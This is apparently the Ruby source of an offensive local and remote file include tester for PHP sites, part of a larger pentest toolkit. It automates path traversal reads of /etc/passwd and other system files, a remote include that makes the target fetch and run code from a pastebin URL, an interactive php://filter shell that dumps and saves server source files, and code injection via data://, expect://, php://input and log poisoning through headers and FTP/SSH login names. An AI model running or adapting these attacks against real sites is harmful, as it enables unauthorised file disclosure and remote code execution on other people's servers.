# Local and Remote File Include Tester
# Primarily Focused on PHP Include Vulnerabilities
# Feel free to add and expand as you like
#
# ToDo: Add Payload Options when vuln is found
#

class Includer
  trap("SIGINT") {
    print_error("CTRL+C! Returning to Previous Menu....")
    return
  }
  def initialize(includer_park, includer_parv, step, null)
    @includer_park=includer_park
    @includer_parv=includer_parv
    @step=step
    @null=null
    @poison='%00'
    @http=EasyCurb.new
    @os=nil; @loginlog=false; @resultz=nil;
    @stepstone=''; @environ=false; @ua=false; @ref=false; @accept=false;
    @includer_postdata=nil;
    @rfi="http://pastebin.com/raw.php?i=VLWhJTzy" # EDIT THIS IF YOU WANT ANOTHER RFI TEST SITE
    # PAYLOAD if executed will message "RFI in the bag" so if you change it make sure this still holds true, below is test payload
    # <? echo CHR(82).CHR(70).CHR(73).CHR(32).CHR(105).CHR(110).CHR(32).CHR(116).CHR(104).CHR(101).CHR(32).CHR(98).CHR(97).CHR(103); ?>
  end

  # Base Test to confirm LFI Vulnerability
  def base_test(link, postdata=nil, min=0, max=11)
    if @os == 'Windows'
      filez = [ "c:\\windows\\win.ini", "c:\\boot.ini" ]
    else
      filez = [ "etc/./././passwd", "proc/self/status", "etc/passwd", "proc/self/./././status", "etc/hosts" ]
    end
    vuln=false
    while(true)
      filez.each do |file|
        if min.to_i == 0
          if @os == 'Windows'
            testfile = file
          else
            testfile = '/' + file # Gets added for us later when we add traversal but not if min = 0 and os = nix
          end
          print_status("Testing: #{testfile}")
          if postdata.nil? #GET
            testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{testfile.urienc}#{@poison}")}" if @null
            testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{testfile.urienc}")}" unless @null
            vuln=true if basic(testlink)
          else #POST
            testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{testfile.urienc}#{@poison}")}" if @null
            testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{testfile.urienc}")}" unless @null
            vuln=true if basic(link, testlink)
          end
        end
        break if vuln
        count = min.to_i + 1 #Need to correct for zero index, users dont know and should need to worry about this
        while count.to_i <= max.to_i
          stepstone = traversal(@step, count.to_i)
          testfile = stepstone + file
          print_status("Testing: #{testfile}")
          if postdata.nil? #GET
            testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{testfile.urienc}#{@poison}")}" if @null
            testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{testfile.urienc}")}" unless @null
            vuln=true if basic(testlink)
          else #POST
            testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{testfile.urienc}#{@poison}")}" if @null
            testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{testfile.urienc}")}" unless @null
            vuln=true if basic(link, testlink)
          end
          @stepstone = stepstone if vuln
          break if vuln
          count = count.to_i + 1
        end
      end
      break
    end
    if vuln
      print_good("Found working LFI with base test!")
      return true
    else
      print_error("Unable to find working LFI with base test!")
      return false
    end
  end

  # Make Basic Requests and Check Response for Various Signs of Vulnerability
  # Print message according to whats found
  # Returns true for match, returns false if not
  def basic(link, postdata=nil)
    if postdata.nil? #GET
      rez = @http.get(link)
    else #POST
      rez = @http.post(link, postdata)
    end

    # Successful Code injection Test will match our regex, failure won't (concat on exec proves its working)
    if rez[0] =~ /:#{@rnd}:(working\.\.\.check,check,1,2,3):#{@rnd}:/ 
      @resultz = $1
      return true
    else
      @resultz=nil
    end

    # Regex for C:\WINDOWS\win.ini file :)
    if rez[0] =~ /(\d+\W\w+\s+\w+\s+\w+\s+\W\w+\W\s+\W\w+\W\s+\W\w+\s\w+\W\s+\W\w+\W\s+\W\w+\W\s+\w+\W\d+)/
      win = $1
      print_good("File Found: C:\\WINDOWS\\win.ini")
      print_line("#{win}")
      print_line("")
      return true
    end

    # Regex for /etc/passwd file
    if rez[0] =~ /(\w+:.:\d+:\d+:.+:.+:\/\w+\/\w+)/m
      passwdz = $1
      print_good("File Found: /etc/passwd")
      print_line("#{passwdz}")
      print_line("")
      return true
    end

    # Regex for /proc/self/status file
    if rez[0] =~ /^Pid:\s+\d+/ and c.body_str =~ /Uid:\s+\d+/ and c.body_str =~ /Gid:\s+\d+/ and c.body_str =~ /FDSize:\s+\d+/
      print_good("File Found: /proc/self/status")
      if rez[0] =~ /Uid:\s+(\d+)/
        @uid = $1
        print_good("Uid: #{@uid}")
      end
      if rez[0] =~ /Gid:\s+(\d+)/
        @gid = $1
        print_good("Gid: #{@gid}")
      end
      if rez[0] =~ /^Pid:\s+(\d+)/
        @pid = $1
        print_good("Pid: #{@pid}")
      end
      if rez[0] =~ /FDSize:\s+(\d+)/
        @fdsize = $1
        print_good("FDSize: #{@fdsize}")
      end
      return true
    end

    # Regex for /proc/self/environ file
    if rez[0] =~ /HTTP_USER_AGENT=|HTTP_ACCEPT=|DOCUMENT_ROOT=|VHOST_ROOT=|HTTP_HOST/
      if rez[0] =~ /HTTP_USER_AGENT=/
        @ua=true
      end
      if rez[0] =~ /HTTP_ACCEPT=/
        @accept=true
      end
      @environ=true
      return true
    else
      @environ=false
    end

    # Regex for INdicators of Possible Log Files:
    if rez[0] =~ /(\[error\])|(User-Agent)|(Mozilla)|(\[client)|(referer)|(HTTP\/)|(\[Sun)|(\[Mon)|(\[Tue)|(\[Wed)|(\[Thu)|(\[Fri)|(\[Sat)|(GET)|(POST)|pam_unix(sshd:auth): authentication failure|(Failed password for \w+) from \d+.\d+.\d+.\d+|(Failed password for invalid user \w+) from \d+.\d+.\d+.\d+|error: (PAM: authentication error for \w+) from \d+.\d+.\d+.\d+/i
      firstmatch=$1
      if rez[0] =~ /User-Agent|Mozilla/i
        @ua=true
      end
      if rez[0] =~ /referer/i
        @ref=true
      end
      if rez[0] =~ /pam_unix(sshd:auth): authentication failure/ or rez[0] =~ /(Failed password for \w+) from \d+.\d+.\d+.\d+/ or rez[0] =~ /(Failed password for invalid user \w+) from \d+.\d+.\d+.\d+/ or rez[0] =~ /error: (PAM: authentication error for \w+) from \d+.\d+.\d+.\d+/
        @loginlog=true
      end
      print_good("Possible Log File Found!")
      if postdata.nil? #GET
        print_good("GET: #{link}")
      else #POST
        print_good("POST: #{link}")
        print_good("DATA: #{postdata}")
      end
      print_good("Regex Match: #{firstmatch}")
      print_good("Possible User-Agent String Found in Response!") if @ua
      print_good("Possible Referer String Found in Response!") if @ref
      print_good("Possible Failed FTP or SSH Authentication Log Found in Response!") if @loginlog
      print_line("")
      answer = Readline.readline("(Display Page Response to confirm Log File (Y/N)?)> ", true)
      if "#{answer.chomp.upcase}" == "YES" or "#{answer.chomp.upcase}" == "Y"
        print_status("OK, here is the page response received:")
        print_status("########################################################################")
        print_line("#{rez[0]}")
        print_status("########################################################################")
        print_line("")
        answer = Readline.readline("(Confirm Log File (Y/N)?)> ", true)
        if "#{answer.chomp.upcase}" == "YES" or "#{answer.chomp.upcase}" == "Y"
          return true
        end
      else #we just assume it is if they dont want to review and regex has hit
        return true
      end
    else
      @loginlog=false
    end
    # Nothing found if we made it this far :(
    return false
  end

  # Remote File Include (RFI) Method
  def rfi(link, postdata=nil)
    if postdata.nil? #GET
      testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{@rfi}#{@poison}")}" if @null
      testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{@rfi}")}" unless @null
      rez = @http.get(testlink)
    else #POST
      testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{@rfi}#{@poison}")}" if @null
      testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{@rfi}")}" unless @null
      rez = @http.post(link, testlink)
    end
    if rez[0] =~ /(RFI in the bag)/i
      winner = $1
      if postdata.nil? #GET
        print_status("GET: #{testlink}")
      else
        print_status("POST: #{link}")
        print_status("DATA: #{testlink}")
      end
      print_good("Holy Shit - RCE via Remote File Inlcude!")
      print_good("#{winner} :)")
      return true
    else
      print_error("Sorry, Remote File Include doesn't appear to be working....")
      print_error("Check manually to be 100% sure....")
      return false
    end
  end

  # PHP data:// Wrapper Method
  # Returns true if vuln, false otherwise
  def data_wrapper(link, postdata=nil)
    rnd = randz(5)
    # If executes, PHP will properly concatenate the string together, otherwise it will remain chopped and fail regex check
    payload = "data://text/plain," + "<?php echo ':'.'#{rnd}:'.'working...check,check,1,2,3'.':#{rnd}'.':'; ?>".urienc
    if postdata.nil? #GET
      testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{payload}#{@poison}")}" if @null
      testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{payload}")}" unless @null
      rez = @http.get(testlink)
    else #POST
      testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{payload}#{@poison}")}" if @null
      testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{payload}")}" unless @null
      rez = @http.post(link, testlink)
    end
    if rez[0] =~ /:#{rnd}:(working\.\.\.check,check,1,2,3):#{rnd}:/ 
      winner = $1
      if postdata.nil? #GET
        print_status("GET: #{testlink.uridec}")
      else
        print_status("POST: #{link}")
        print_status("DATA: #{testlink.uridec}")
      end
      print_good("Remote Code Injection Found via: data://")
      print_good("#{winner} :)")
      return true
    else
      print_error("Sorry, data:// method doesn't appear to be working....")
      print_error("Check manually to be 100% sure....")
      return false
    end
  end

  # PHP PECL EXPECT:// Wrapper Method
  # Returns true if vuln, false otherwise
  def expect_wrapper(link, postdata=nil)
    rnd = randz(5)
    # If executes, PHP will properly concatenate the string together, otherwise it will remain chopped and fail regex check
    payload = "expect://a=\"#{rnd}\";b=\"working...check,check,1,2,3\"; echo ':'$a':'$b':'$a':';".urienc
    if postdata.nil? #GET
      testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{payload}#{@poison}")}" if @null
      testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{payload}")}" unless @null
      rez = @http.get(testlink)
    else #POST
      testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{payload}#{@poison}")}" if @null
      testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{payload}")}" unless @null
      rez = @http.post(link, testlink)
    end
    if rez[0] =~ /:#{rnd}:(working\.\.\.check,check,1,2,3):#{rnd}:/ 
      winner = $1
      if postdata.nil? #GET
        print_status("GET: #{testlink.uridec}")
      else
        print_status("POST: #{link}")
        print_status("DATA: #{testlink.uridec}")
      end
      print_good("Remote Code Injection Found via: expect://")
      print_good("#{winner} :)")
      return true
    else
      print_error("Sorry, expect:// method doesn't appear to be working....")
      print_error("Most likely, it's not installed or supported since its a PECL package....")
      print_error("Check manually to be 100% sure....")
      return false
    end
  end

  # PHP://FILTERS Wrapper Method
  # Source Code Disclosure provided from this vulnerability
  # Drops to a Pseudo Shell to take advantage of things
  # All files saved to /results/ for safe keeping
  def filters_wrapper(link, postdata=nil?)
    print_status("Welcome to the php://filters File Reader Shell")
    print_caution("Provide path to file to read....")
    print_caution("EX: index")
    print_caution("EX: ../includes/config.php")
    print_status("Remember NULL Byte is DISABLED!") unless @null
    print_status("Remember NULL Byte is ENABLED!") if @null
    print_error("NOTE: If you get duplicate results make the request again, working on that bug still, sorry....")
    print_line("")
    print_status("Dropping to File Reader Shell now.....")
    print_caution("Type 'EXIT' or 'QUIT' to exit the shell")
    print_line("")

    @previous = 'foobar'
    prompt = "(File Read3r)> "
    while line = Readline.readline("#{prompt}", true)
      cmd = line.chomp
      case cmd
      when /^exit$|^quit$|^back$/i
        print_error("OK, Returning to previous menu....")
        break
      else
        inj = "php://filter/convert.base64-encode/resource=#{cmd}"
        if postdata.nil? #GET
          testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{inj}#{@poison}")}" if @null
          testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{inj}")}" unless @null
          rez = @http.get(testlink)
        else #POST
          testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{inj}#{@poison}")}" if @null
          testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{inj}")}" unless @null
          rez = @http.post(link, testlink)
        end
        if @previous == rez[0]
          print_line("")
          print_caution("Repeated Results, this may be due to small bug....")
          print_error("Not finding any Base64 Strings in Response!")
          print_error("It might not be working or requested file might not exist.....")
          print_error("Try another file or confirm things manually....")
          print_line("")
        else
          # Check & Extract Base64 Results if successful
          if rez[0] =~ /([A-Za-z0-9+\/]{8,}[A-Za-z0-9+\/]{1}|[A-Za-z0-9+\/]{3}=|[A-Za-z0-9+\/]{2}==)/
            checking = $1
            if checking =~ /([A-Za-z0-9+\/]{8,})/
              base64_str = $1
            end
            if not base64_str.nil?
              # Get rid of false positives cause regex seems to match blanks in addition to base64 strings :(. 
              # This will consider anything less than 5 chars to be bogus. Not perfect, but should cover most cases for us....
              if base64_str.size > 5 
                print_good("Appears to be working, found Base64 String in Response!")
                base64_decoded_str = base64_str.unpack('m')[0]
                print_good("Decoded Response: ")
                print_line("#{base64_decoded_str}")
                print_line("")

                # Log Results for safe keeping :)
                logdir = RESULTS + link.sub('http://', '').sub('https://', '').sub(/\/$/, '').split("/")[0]
                logfile = logdir.sub(/\/$/, '') + '/' + cmd.gsub('/', '_').gsub('\\', '_').gsub(/[;:'",.~`!@#$\%^&*\(\)=\[\]]/, '_')
                Dir.mkdir(logdir) unless File.exists?(logdir) and File.directory?(logdir)
                f=File.open(logfile, 'w+')
                f.puts base64_decoded_str
                f.close
              else
                print_line("")
                print_error("Not finding any Base64 Strings in Response!")
                print_error("It might not be working or requested file might not exist.....")
                print_error("Try another file or confirm things manually....")
                print_line("")
              end
            else
              print_line("")
              print_error("Not finding any Base64 Strings in Response!")
              print_error("It might not be working or requested file might not exist.....")
              print_error("Try another file or confirm things manually....")
              print_line("")
            end
          end
        end
        @previous = rez[0]
      end
    end
  end

  # Exploit PHP://INPUT Wrapper
  def input_wrapper(link)
    testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=php://input#{@poison}")}" if @null
    testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=php://input")}" unless @null
    rnd = randz(5)
    payload = "<?echo \":\".\"#{rnd}:\".\"working...check,check,1,2,3\".\":#{rnd}:\";?>"
    rez = @http.post(testlink, payload)
    if rez[0] =~ /:#{rnd}:(working\.\.\.check,check,1,2,3):#{rnd}:/ 
      winner = $1
      print_status("POST: #{testlink}")
      print_status("DATA: #{payload}")
      print_good("Remote Code Injection Found via: php://input")
      print_good("#{winner} :)")
      return true
    else
      print_error("Sorry, php://input method doesn't appear to be working....")
      return false
    end
  end

  # /proc/self/environ Method
  def proc_environ(link, postdata=nil)
    if @os == 'Windows'
      print_error("Your target appears to be Winblows!")
      print_error("This option is only available for some Linux based targets!")
    else
      filez = [ "proc/self/./././environ", "proc/self/environ" ]
      vuln=false
      while(true)
        filez.each do |file|
          if @min.to_i == 0
            testfile = '/' + file
          else
            testfile = @stepstone + file
          end
          print_status("Testing: #{testfile}")
          if postdata.nil? #GET
            testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{testfile}#{@poison}")}" if @null
            testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{testfile}")}" unless @null
            vuln=true if basic(testlink)
          else #POST
            testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{testfile}#{@poison}")}" if @null
            testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{testfile}")}" unless @null
            vuln=true if basic(link, testlink)
          end
          zfile=testfile if vuln
          break if vuln
        end
        break
      end
      if vuln
        print_good("File Found: #{zfile}")
        print_good("User-Agent is present in response!") if @ua
        print_good("Accept Header is present in response!") if @accept
        if not @ua and not @accept
          print_error("No Headers Visibly Available for Header Based Injection!")
          print_error("Check manually to confirm 100%, sorry....")
          return false
        end
        vuln=false
        if @ua
          print_status("Testing Code Injection via User-Agent Header......")
          oldua=$config['HTTP']['HTTP_USER_AGENT']
          @rnd = randz(5)
          $config['HTTP']['HTTP_USER_AGENT'] = "<?error_reporting(0);echo \":\".\"#{@rnd}:\".\"working...check,check,1,2,3\".\":#{@rnd}:\";?>"
          if postdata.nil? #GET
            testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{zfile}#{@poison}")}" if @null
            testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{zfile}")}" unless @null
            if basic(testlink) and not @resultz.nil?
              vuln=true
              print_status("GET: #{testlink}")
              print_status("User-Agent: #{$config['HTTP']['HTTP_USER_AGENT']}")
            end
          else #POST
            testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{zfile}#{@poison}")}" if @null
            testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{zfile}")}" unless @null
            if basic(link, testlink) and not @resultz.nil?
              vuln=true 
              print_status("POST: #{link}")
              print_status("DATA: #{testlink}")
              print_status("User-Agent: #{$config['HTTP']['HTTP_USER_AGENT']}")
            end
          end
          $config['HTTP']['HTTP_USER_AGENT']=oldua
          if vuln
            print_good("Remote Code Injection Found!")
            print_good("#{@resultz} :)")
            return true
          else
            print_error("User-Agent Based Injection Not Working!")
            if @accept
              print_error("Going to Try via the Accept Header....")
            else
              print_error("Check manually to confirm 100%, sorry....")
              return false
            end
          end
        end
        if not vuln and @accept
          @rnd = randz(5)
          payload = "<?error_reporting(0);echo \":\".\"#{@rnd}:\".\"working...check,check,1,2,3\".\":#{@rnd}:\";?>"
          # Add custom headers for Accept Injection
          $config['HTTP']['HTTP_HEADERS_ADD']=true
          $config['HTTP']['HTTP_HEADERS'].store("Accept", payload)
          if postdata.nil? #GET
            testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{zfile}#{@poison}")}" if @null
            testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{zfile}")}" unless @null
            if basic(testlink) and not @resultz.nil?
              vuln=true
              print_status("GET: #{testlink}")
              print_status("Accept Header: #{payload}")
            end
          else #POST
            testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{zfile}#{@poison}")}" if @null
            testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{zfile}")}" unless @null
            if basic(link, testlink) and not @resultz.nil?
              vuln=true 
              print_status("POST: #{link}")
              print_status("DATA: #{testlink}")
              print_status("Accept Header: #{payload}")
            end
          end
          $config['HTTP']['HTTP_HEADERS_ADD']=false
          if vuln
            print_good("Remote Code Injection Found!")
            print_good("#{@resultz} :)")
            return true
          else
            print_error("Accept Header Based Injection Not Working!")
            print_error("Check manually to confirm 100%, sorry....")
            return false
          end
        end
      else
        print_error("Sorry, /proc/self/environ doesn't appear to be available.....")
        print_error("Always best to check manually to confirm, sorry....")
        return false
      end
    end
  end

  # Log Poisoning Exploit via Common Log Files
  def logs(link, postdata=nil)
    if @os == 'Windows'
      logfilez = [ "c:\\Program Files\\Apache Group\\Apache\\logs\\access.log", "c:\\Program Files\\Apache Group\\Apache\\logs\\access_log", "c:\\Program Files\\Apache Group\\Apache\\logs\\error.log", "c:\\Program Files\\Apache Group\\Apache\\logs\\error_log", "c:\\Program Files\\xampp\apache\\logs\\access_log", "c:\\Program Files\\xampp\apache\\logs\\access.log", "c:\\Program Files\\xampp\apache\\logs\\error_log", "c:\\Program Files\\xampp\apache\\logs\\error.log", "c:\\logs\\access.log", "c:\\logs\\access_log", "c:\\logs\\error.log", "c:\\logs\\error_log", "c:\\apache\\logs\\access.log", "c:\\apache\\logs\\access_log", "c:\\apache\\logs\\error.log", "c:\\apache\\logs\\error_log", "c:\\apache2\\logs\\access.log", "c:\\apache2\\logs\\access_log", "c:\\apache2\\logs\\error.log", "c:\\apache2\\logs\\error_log", "c:\\xampp\\apache\\logs\\error.log", "c:\\xampp\\apache\\logs\\access.log", "c:\\xampp\\FileZillaFTP\\Logs\\error.log", "c:\\xampp\\FileZillaFTP\\Logs\\access.log", "c:\\xampp\\MercuryMail\\LOGS\\error.log", "c:\\xampp\\MercuryMail\\LOGS\\access.log", "c:\\log\\httpd\\access_log", "c:\\log\\httpd\\error_log", "c:\\logs\\httpd\\access_log", "c:\\logs\\httpd\\error_log" ]
    else
      logfilez = [ "etc/apache/logs/error.log", "etc/apache/logs/access.log", "etc/apache2/logs/error.log", "etc/apache2/logs/access.log", "etc/apache/logs/error_log", "etc/apache/logs/access_log", "etc/apache2/logs/error_log", "etc/apache2/logs/access_log", "etc/httpd/logs/acces_log", "etc/httpd/logs/acces.log", "etc/httpd/logs/error_log", "etc/httpd/logs/error.log", "var/www/logs/access_log", "var/www/logs/access.log", "usr/local/apache/logs/access_log", "usr/local/apache/logs/access.log", "var/log/apache/access_log", "var/www/log/access_log", "var/www/log/access.log", "var/www/log/error_log", "var/www/log/error.log", "usr/local/apache2/logs/access_log", "usr/local/apache2/logs/access.log", "usr/local/apache2/logs/error_log", "usr/local/apache2/logs/error.log", "var/log/apache2/access_log", "var/log/apache/access.log", "var/log/apache2/access.log", "var/log/access_log", "var/log/access.log", "var/www/logs/error_log", "var/www/logs/error.log", "usr/local/apache/logs/error_log", "usr/local/apache/logs/error.log", "var/log/apache/error_log", "var/apache2/logs/access_log", "var/apache2/logs/error_log", "var/log/httpd-error.log", "var/log/httpd-access.log", "var/log/apache2/error_log", "var/log/apache/error.log", "var/log/apache2/error.log", "var/log/error_log", "var/log/error.log", "var/log/httpd/access.log", "var/log/httpd/access_log", "var/log/httpd/error.log", "var/log/httpd/error_log", "opt/lampp/logs/access_log", "opt/lampp/logs/access.log", "opt/lampp/logs/error_log", "opt/lampp/logs/error.log", "opt/xampp/logs/access_log", "opt/xampp/logs/access.log", "opt/xampp/logs/error_log", "opt/xampp/logs/error.log", "var/log/ftp.log", "var/log/proftpd/auth.log", "var/log/proftpd/proftpd.log", "var/log/auth.log", "var/log/ssh/auth.log", "var/log/secure" ]
    end
    print_status("Searching for Common Log Files.....")
    vuln=false
    while(true)
      logfilez.each do|file|
        if @os != 'Windows'
          if @min.to_i == 0
            test="/#{file}"
          else
            test="#{@stepstone}#{file}"
          end
        else
          test="#{@stepstone}#{file}"
        end
        print_status("Testing: #{test}")
        if postdata.nil? #GET
          testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}#{@poison}")}" if @null
          testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}")}" unless @null
          vuln=true if basic(testlink)
        else #POST
          testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}#{@poison}")}" if @null
          testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}")}" unless @null
          vuln=true if basic(link, testlink)
        end
        if vuln
          vuln=false
          if @ua
            print_status("Testing Code Injection via User-Agent Header......")
            oldua=$config['HTTP']['HTTP_USER_AGENT']
            @rnd = randz(5)
            $config['HTTP']['HTTP_USER_AGENT'] = "<?error_reporting(0);echo \":\".\"#{@rnd}:\".\"working...check,check,1,2,3\".\":#{@rnd}:\";?>"
            if postdata.nil? #GET
              testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}#{@poison}")}" if @null
              testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}")}" unless @null
              if basic(testlink) and not @resultz.nil?
                vuln=true
                print_status("GET: #{testlink}")
                print_status("User-Agent Header: #{$config['HTTP']['HTTP_USER_AGENT']}")
              end
            else #POST
              testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}#{@poison}")}" if @null
              testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}")}" unless @null
              vuln=true if basic(link, testlink)
              if vuln and not @resultz.nil?
                vuln=true
                print_status("POST: #{link}")
                print_status("DATA: #{testlink}")
                print_status("User-Agent Header: #{$config['HTTP']['HTTP_USER_AGENT']}")
              end
            end
            $config['HTTP']['HTTP_USER_AGENT']=oldua
            if vuln
              print_good("Remote Code Injection Found!")
              print_good("#{@resultz} :)")
            else
              print_error("User-Agent Based Injection Not Working!")
              print_error("Always best to check manually to confirm, sorry....")
            end
          end
          if not vuln and @ref
            print_status("Testing Code Injection via Referer Header......")
            @rnd = randz(5)
            payload = "<?error_reporting(0);echo \":\".\"#{@rnd}:\".\"working...check,check,1,2,3\".\":#{@rnd}:\";?>"
            # Add custom headers for Accept Injection
            $config['HTTP']['HTTP_HEADERS_ADD']=true
            $config['HTTP']['HTTP_HEADERS'].store("Referer", payload)
            if postdata.nil? #GET
              testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}#{@poison}")}" if @null
              testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}")}" unless @null
              if basic(testlink) and not @resultz.nil?
                vuln=true
                print_status("GET: #{testlink}")
                print_status("Referer Header: #{payload}")
              end
            else #POST
              testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}#{@poison}")}" if @null
              testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}")}" unless @null
              if basic(link, testlink) and not @resultz.nil?
                vuln=true 
                print_status("POST: #{link}")
                print_status("DATA: #{testlink}")
                print_status("Referer Header: #{payload}")
              end
            end
            $config['HTTP']['HTTP_HEADERS_ADD']=false
            if vuln
              print_good("Remote Code Injection Found!")
              print_good("#{@resultz} :)")
            else
              print_error("Referer Header Based Injection Not Working!")
              print_error("Always best to check manually to confirm, sorry....")
            end
          end
          if not vuln and @loginlog
            @rnd = randz(5)
            payload = "<?error_reporting(0);echo \":\".\"#{@rnd}:\".\"working...check,check,1,2,3\".\":#{@rnd}:\";?>"
            while(true)
              print_caution("Select Injection Method: ")
              print_caution("1) FTP Login Based Injection")
              print_caution("2) SSH Login Based Injection")
              method = Readline.readline("(Continue Search for more Logs (Y/N)?)> ", true)
              if method.chomp.to_i == 1
                meth='FTP'
                print_status("Testing FTP Username Login Based Code Injection......")
                host=link.sub('http://', '').sub('https://', '').sub(/\/$/, '').split("/")[0]
                begin
                  ftp = Net::FTP.new(host) #ftp object to target
                  ftp.login(payload, 'fooFucked') #inject via username field as it shows in most ftp log files
                  ftp.close #close connect as we dont care or need anything
                rescue
                  print_good("Error Triggered, hope it works!")
                end
                break
              elsif method.chomp.to_i == 2
                meth='SSH'
                print_status("Testing SSH Login Based Code Injection......")
                begin 
                  # Trigger injection via SSH username field....
                  ssh = Net::SSH.start(host, payload, :password => 'fooFucked')
                  foofucked = ssh.exec!('ls') # We will never make it here :p
                  ssh.close if ssh
                rescue
                  print_good("Error Triggered, hope it works!")
                end
                break
              else
                print_line("")
                print_error("Oops, Didn't quite understand that one")
                print_error("Please Choose a Valid Option From Menu Below Next Time.....")
                print_line("")
              end
            end
            if postdata.nil? #GET
              testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}#{@poison}")}" if @null
              testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}")}" unless @null
              vuln=true if basic(testlink) and not @resultz.nil?
            else #POST
              testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}#{@poison}")}" if @null
              testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}")}" unless @null
              vuln=true if basic(link, testlink) and not @resultz.nil?
            end
            if vuln
              print_good("Remote Code Injection Found!")
              print_good("#{@resultz} :)")
            else
              print_error("#{meth} Username Login Based Injection Not Working!")
              print_error("Always best to check manually to confirm, sorry....")
            end
          end
          if not vuln
            print_status("Testing URI Code Injection......")
            @rnd = randz(5)
            payload = "<?error_reporting(0);echo \":\".\"#{@rnd}:\".\"working...check,check,1,2,3\".\":#{@rnd}:\";?>"
            foofuck = randz(15)
            foopath = foofuck + payload
            foofucked = 'http://' + link.sub('http://', '').sub('https://', '').sub(/\/$/, '').split("/")[0] + foopath
            rez = @http.get(foofucked)
            print_error("WTF - somehow we received 200 response, not sure this is going to work") if rez[1] == 200
            if postdata.nil? #GET
              testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}#{@poison}")}" if @null
              testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}")}" unless @null
              if basic(testlink) and not @resultz.nil?
                vuln=true
                print_status("GET: #{testlink}")
              end
            else #POST
              testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}#{@poison}")}" if @null
              testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}")}" unless @null
              if basic(link, testlink) and not @resultz.nil?
                vuln=true 
                print_status("POST: #{link}")
                print_status("DATA: #{testlink}")
              end
            end
            if vuln
              print_good("Remote Code Injection Found!")
              print_good("#{@resultz} :)")
            else
              print_error("URI Based Injection Not Working!")
              print_error("Always best to check manually to confirm, sorry....")
            end
          end
        end
        if vuln
          answer = Readline.readline("(Continue Search for more Logs (Y/N)?)> ", true)
          if answer.chomp[0].upcase == 'N'
            break
          end
          vuln=false
        end
      end
      break
    end
  end

  # Log Poisoning Exploit via /proc/self/fd/ file descriptor links
